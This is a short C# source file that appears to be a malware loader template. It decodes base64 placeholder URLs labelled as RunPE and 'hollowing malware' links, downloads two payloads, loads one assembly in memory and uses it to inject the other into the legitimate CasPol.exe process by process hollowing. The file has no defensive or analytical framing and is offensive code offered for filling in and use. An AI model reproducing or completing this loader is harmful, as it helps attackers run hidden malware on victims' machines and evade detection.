using System;
using System.Net;
using System.Reflection;
using System.Text;



namespace Runpereversed
{

	internal static partial class Program
	{

		[STAThread]
		private static void Main()
		{
			
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;


			WebClient webClient = new WebClient();


			string rawww = Encoding.UTF8.GetString(Convert.FromBase64String("RUNPE link"));

			byte[] ByrawAssembly = webClient.DownloadData(rawww);



			WebClient webClient2 = new WebClient();

			string asdasdasdas = Encoding.UTF8.GetString(Convert.FromBase64String("HOLLOWİNG m@lware Links"));

			Uri address = new Uri(asdasdasdas);

			byte[] array6 = webClient2.DownloadData(address);
			object obj = new object[]
			{
				"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe",
				string.Empty,
				array6,
				true
			};
			string target = null;
			Assembly assembly = Assembly.Load(ByrawAssembly);
			assembly.GetType("PROJEADI.CLASSNAME").InvokeMember("RUNMETHODU", BindingFlags.InvokeMethod, null, target, (object[])obj);
			WebClient wc = new WebClient();






		}


	}
}

